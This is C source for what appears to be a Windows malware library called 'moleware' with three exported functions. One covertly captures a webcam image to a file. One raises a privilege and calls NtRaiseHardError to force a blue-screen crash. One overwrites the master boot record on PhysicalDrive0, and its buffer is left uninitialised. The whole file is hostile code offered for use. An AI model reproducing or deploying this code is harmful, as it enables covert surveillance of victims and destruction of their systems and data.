#include <windows.h>
#include <Vfw.h>
#include <stdio.h>
#include <stdlib.h>
#include "moleware.h"
#include <winternl.h>


typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

EXPORT void picture(){
    HWND camera = capCreateCaptureWindowA((LPCSTR)"hoven", WS_CHILD, 0, 0, 0, 0, GetDesktopWindow(), 0);

    for(int i = 0; i < 9; i++){
      if(capDriverConnect(camera, i)){
        capFileSaveDIB(camera, "capture.bmp");
        DestroyWindow(camera);
      }
    }

    DestroyWindow(camera);
}

EXPORT void bluescreen(){
    BOOLEAN bEnabled;
    ULONG uResp;
    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled); 
    NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp); 
}

EXPORT void wipe_mbr(){
  DWORD b_write = 512;
  char zero_mbr[512];
  HANDLE mbr = CreateFileW((LPCWSTR)"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
  WriteFile(mbr, (LPCVOID)zero_mbr, 512, &b_write, 0);
}

int main() {
  
}